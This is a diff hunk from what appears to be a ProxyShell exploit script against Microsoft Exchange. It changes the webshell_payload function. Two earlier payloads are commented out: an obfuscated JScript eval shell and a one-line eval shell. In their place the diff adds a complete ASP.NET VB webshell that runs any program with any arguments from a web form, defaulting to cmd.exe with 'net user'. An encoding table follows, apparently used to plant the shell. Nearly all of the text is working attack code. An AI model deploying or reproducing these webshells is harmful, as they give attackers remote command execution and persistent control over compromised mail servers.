@@ -30,7 +30,44 @@ subj_ = rand_string(16)
 def webshell_payload():
     # Credits: https://github.com/ktecv2000/ProxyShell/blob/main/exploit.py#L175
     #payload =  '<%@ Page Language="Jscript" %><%var/*-/*-*/P/*-/*-*/=/*-/*-*/"e"+"v"+/*-/*-*/"a"+"l"+"("+"R"+"e"+/*-/*-*/"q"+"u"+"e"/*-/*-*/+"s"+"t"+"[/*-/*-*/0/*-/*-*/-/*-/*-*/0/*-/*-*/-/*-/*-*/7/*-/*-*/]"+","+"\""+"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"+"\""+")";eval (/*-/*-*/P/*-/*-*/,/*-/*-*/"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"/*-/*-*/);%>'
-    payload = '<script language="JScript" runat="server" Page aspcompat=true>function Page_Load(){eval(Request["exec_code"],"unsafe");}</script>'
+    #payload = '<script language="JScript" runat="server" Page aspcompat=true>function Page_Load(){eval(Request["exec_code"],"unsafe");}</script>'
+    payload = """<%@ Page Language="VB" Debug="true" %>
+<%@ import Namespace="system.IO" %>
+<%@ import Namespace="System.Diagnostics" %>
+
+<script runat="server">      
+
+Sub RunCmd(Src As Object, E As EventArgs)            
+  Dim myProcess As New Process()            
+  Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)            
+  myProcessStartInfo.UseShellExecute = false            
+  myProcessStartInfo.RedirectStandardOutput = true            
+  myProcess.StartInfo = myProcessStartInfo            
+  myProcessStartInfo.Arguments=xcmd.text            
+  myProcess.Start()            
+
+  Dim myStreamReader As StreamReader = myProcess.StandardOutput            
+  Dim myString As String = myStreamReader.Readtoend()            
+  myProcess.Close()            
+  mystring=replace(mystring,"<","&lt;")            
+  mystring=replace(mystring,">","&gt;")            
+  result.text= vbcrlf & "<pre>" & mystring & "</pre>"    
+End Sub
+
+</script>
+
+<html>
+<body>    
+<form runat="server">        
+<p><asp:Label id="L_p" runat="server" width="80px">Program</asp:Label>        
+<asp:TextBox id="xpath" runat="server" Width="300px">c:\windows\system32\cmd.exe</asp:TextBox>        
+<p><asp:Label id="L_a" runat="server" width="80px">Arguments</asp:Label>        
+<asp:TextBox id="xcmd" runat="server" Width="300px" Text="/c net user">/c net user</asp:TextBox>        
+<p><asp:Button id="Button" onclick="runcmd" runat="server" Width="100px" Text="Run"></asp:Button>        
+<p><asp:Label id="result" runat="server"></asp:Label>       
+</form>
+</body>
+</html>"""
     compEnc = [0x47, 0xf1, 0xb4, 0xe6, 0x0b, 0x6a, 0x72, 0x48, 0x85, 0x4e, 0x9e, 0xeb, 0xe2, 0xf8, 0x94,
                0x53, 0xe0, 0xbb, 0xa0, 0x02, 0xe8, 0x5a, 0x09, 0xab, 0xdb, 0xe3, 0xba, 0xc6, 0x7c, 0xc3, 0x10, 0xdd, 0x39,
                0x05, 0x96, 0x30, 0xf5, 0x37, 0x60, 0x82, 0x8c, 0xc9, 0x13, 0x4a, 0x6b, 0x1d, 0xf3, 0xfb, 0x8f, 0x26, 0x97,
